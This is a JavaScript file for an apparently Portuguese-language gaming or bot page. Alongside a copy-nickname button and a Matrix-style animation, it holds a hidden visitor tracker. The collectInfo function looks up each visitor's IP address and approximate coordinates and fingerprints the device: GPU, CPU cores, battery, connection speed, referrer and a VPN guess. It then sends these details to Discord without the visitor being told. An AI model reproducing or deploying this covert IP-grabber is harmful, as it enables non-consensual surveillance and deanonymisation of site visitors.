function copyNick() {
  const nick = 'ZENEC AMASSA BOT';
  navigator.clipboard.writeText(nick).then(() => {
    alert('Nick copiado! Pronto pra perder?');
  }).catch(() => {
    const textarea = document.createElement('textarea');
    textarea.value = nick;
    textarea.style.position = 'fixed';
    textarea.style.opacity = '0';
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
    alert('Nick copiado! Pronto pra perder?');
  });
}

// Função para detectar navegador de forma simplificada
function getSimpleBrowser() {
  const ua = navigator.userAgent;
  
  if (ua.includes('Edg/')) {
    return 'Microsoft Edge';
  } else if (ua.includes('Chrome/') && !ua.includes('Edg')) {
    return 'Google Chrome';
  } else if (ua.includes('Firefox/')) {
    return 'Mozilla Firefox';
  } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
    return 'Safari';
  } else if (ua.includes('Opera/') || ua.includes('OPR/')) {
    return 'Opera';
  } else if (ua.includes('Brave/')) {
    return 'Brave';
  } else {
    return 'Navegador Desconhecido';
  }
}

// Função para obter informações de hardware avançadas
async function getAdvancedInfo() {
  const info = {};
  
  // GPU/Placa de Vídeo
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      } else {
        info.gpu = 'N/A';
      }
    } else {
      info.gpu = 'WebGL não suportado';
    }
  } catch (e) {
    info.gpu = 'Erro ao detectar GPU';
  }

  // Cores do Processador
  if (navigator.hardwareConcurrency) {
    info.cores = navigator.hardwareConcurrency + ' Cores';
  } else {
    info.cores = 'N/A';
  }

  // Bateria
  try {
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      const batteryLevel = Math.round(battery.level * 100);
      const charging = battery.charging ? 'Carregando' : 'Descarregando';
      info.battery = `${batteryLevel}% (${charging})`;
    } else {
      info.battery = 'N/A';
    }
  } catch (e) {
    info.battery = 'N/A';
  }

  // Velocidade da Internet
  try {
    if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection.downlink) {
        info.internet = connection.downlink + ' Mbps';
      } else {
        info.internet = 'N/A';
      }
    } else {
      info.internet = 'N/A';
    }
  } catch (e) {
    info.internet = 'N/A';
  }

  // Histórico (quantidade aproximada)
  try {
    info.history = window.history.length + ' páginas nesta aba';
  } catch (e) {
    info.history = 'N/A';
  }

  // Pixel Ratio
  info.pixelRatio = window.devicePixelRatio || 1;
  
  // Cookies habilitados
  info.cookiesEnabled = navigator.cookieEnabled ? 'Sim' : 'Não';
  
  // Do Not Track
  info.doNotTrack = navigator.doNotTrack === '1' || window.doNotTrack === '1' ? 'Ativado' : 'Desativado';
  
  // Detectar possível VPN/Proxy
  info.vpnSuspect = false;
  info.vpnReasons = [];

  return info;
}

// Verificar se IP já enviou na última hora
function checkIPCooldown(ip) {
  const storageKey = 'zenec_ip_cooldown';
  const stored = localStorage.getItem(storageKey);
  const now = Date.now();
  const ONE_HOUR = 60 * 60 * 1000; // 1 hora em ms
  
  if (!stored) {
    return { canSend: true };
  }
  
  try {
    const ipData = JSON.parse(stored);
    
    // Limpa IPs expirados
    Object.keys(ipData).forEach(storedIP => {
      if (now - ipData[storedIP] > ONE_HOUR) {
        delete ipData[storedIP];
      }
    });
    
    // Atualiza localStorage com dados limpos
    localStorage.setItem(storageKey, JSON.stringify(ipData));
    
    // Verifica se o IP atual está bloqueado
    if (ipData[ip]) {
      const timeLeft = ONE_HOUR - (now - ipData[ip]);
      const minutesLeft = Math.floor(timeLeft / 60000);
      const secondsLeft = Math.floor((timeLeft % 60000) / 1000);
      
      return {
        canSend: false,
        minutesLeft,
        secondsLeft,
        timeLeft
      };
    }
    
    return { canSend: true };
  } catch (e) {
    console.error('Erro ao verificar cooldown:', e);
    return { canSend: true };
  }
}

// Salvar IP com timestamp
function saveIPCooldown(ip) {
  const storageKey = 'zenec_ip_cooldown';
  const stored = localStorage.getItem(storageKey);
  const ipData = stored ? JSON.parse(stored) : {};
  
  ipData[ip] = Date.now();
  localStorage.setItem(storageKey, JSON.stringify(ipData));
  
  console.log('✅ IP salvo. Bloqueado por 1 hora.');
}

// Coletar todas as informações e enviar UMA vez por hora
async function collectInfo() {
  try {
    console.log('🔍 Iniciando coleta de dados...');
    
    // 1. Busca o IP primeiro
    let currentIP;
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      currentIP = ipData.ip;
      console.log('🌐 IP detectado:', currentIP);
    } catch (error) {
      console.error('❌ Erro ao buscar IP:', error);
      return;
    }
    
    // 2. Verifica cooldown
    const cooldown = checkIPCooldown(currentIP);
    if (!cooldown.canSend) {
      console.log(`⚠️ IP bloqueado! Aguarde ${cooldown.minutesLeft}min ${cooldown.secondsLeft}s`);
      return;
    }
    
    console.log('✅ IP liberado! Coletando dados...');
    
    // 3. Coleta informações avançadas
    const advancedInfo = await getAdvancedInfo();
    
    // 4. Busca localização por IP
    console.log('🌍 Buscando localização...');
    let locationData;
    
    try {
      const response1 = await fetch('https://ipapi.co/json/');
      locationData = await response1.json();
      
      if (locationData.error) {
        throw new Error('Rate limit');
      }
      
      console.log('✅ Localização obtida');
      
    } catch (e) {
      console.log('⚠️ Tentando API alternativa...');
      try {
        const response2 = await fetch('https://ipwho.is/');
        const geoData = await response2.json();
        
        locationData = {
          ip: geoData.ip,
          city: geoData.city,
          region: geoData.region,
          country_name: geoData.country,
          country_code: geoData.country_code,
          latitude: geoData.latitude,
          longitude: geoData.longitude,
          timezone: geoData.timezone?.id,
          org: geoData.connection?.isp || geoData.connection?.org || 'N/A',
          asn: geoData.connection?.asn
        };
        
      } catch (e2) {
        locationData = { ip: currentIP };
      }
    }
    
    // 5. Coordenadas
    const coords = locationData.latitude && locationData.longitude 
      ? `${locationData.latitude}, ${locationData.longitude}`
      : 'N/A';
    const accuracy = coords !== 'N/A' ? 'Cidade/Estado (~2-10km)' : 'N/A';
    
    // 6. Detecta VPN/Proxy
    let vpnStatus = 'Não detectado';
    const reasons = [];
    
    const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const ipTimezone = locationData.timezone;
    
    if (ipTimezone && browserTimezone !== ipTimezone) {
      reasons.push('Timezone incompatível');
    }
    
    const vpnKeywords = ['vpn', 'proxy', 'hosting', 'datacenter', 'cloud', 'virtual', 'digital ocean', 'aws', 'azure', 'ovh'];
    const ispLower = (locationData.org || '').toLowerCase();
    
    if (vpnKeywords.some(keyword => ispLower.includes(keyword))) {
      reasons.push('ISP suspeito');
    }
    
    if (reasons.length > 0) {
      vpnStatus = `⚠️ Possível VPN/Proxy (${reasons.join(', ')})`;
    }
    
    // 7. Monta sistema
    const systemInfo = `${navigator.platform} (${advancedInfo.cores})`;
    const browserName = getSimpleBrowser();
    
    // 8. Monta dados completos
    const fullData = {
      time: new Date().toLocaleString('pt-BR'),
      platform: systemInfo,
      browser: browserName,
      screen: `${screen.width}x${screen.height} (${advancedInfo.pixelRatio}x)`,
      language: navigator.language,
      referrer: document.referrer || "Acesso direto",
      ip: locationData.ip || currentIP,
      location: `${locationData.city || '?'}, ${locationData.region || '?'}, ${locationData.country_name || '?'}`,
      isp: locationData.org || "N/A",
      coords: coords,
      accuracy: accuracy,
      timezone: locationData.timezone || browserTimezone,
      countryCode: locationData.country_code || "N/A",
      asn: locationData.asn || "N/A",
      gpu: advancedInfo.gpu,
      battery: advancedInfo.battery,
      internet: advancedInfo.internet,
      cookies: advancedInfo.cookiesEnabled,
      dnt: advancedInfo.doNotTrack,
      vpn: vpnStatus,
      history: advancedInfo.history
    };

    // 9. Envia dados
    console.log('📤 Enviando para Discord...');
    const sent = await sendToDiscord(fullData);
    
    // 10. Salva IP se enviou com sucesso
    if (sent) {
      saveIPCooldown(currentIP);
    }
    
  } catch (error) {
    console.error('❌ Erro geral:', error);
  }
}

// Executar quando carregar

// Matrix background
window.addEventListener('load', function() {
  const canvas = document.createElement('canvas');
  canvas.id = 'matrix';
  canvas.style.position = 'fixed';
  canvas.style.top = '0';
  canvas.style.left = '0';
  canvas.style.width = '100%';
  canvas.style.height = '100%';
  canvas.style.zIndex = '1';
  canvas.style.pointerEvents = 'none';
  document.body.appendChild(canvas);

  const ctx = canvas.getContext('2d');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  const chars = '01';
  const fontSize = 14;
  const columns = canvas.width / fontSize;
  const drops = [];

  for (let i = 0; i < columns; i++) {
    drops[i] = Math.random() * canvas.height / fontSize;
  }

  function drawMatrix() {
    ctx.fillStyle = 'rgba(5, 5, 7, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#0f0';
    ctx.font = fontSize + 'px monospace';

    for (let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);

      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }

  setInterval(drawMatrix, 35);

  window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  });
});
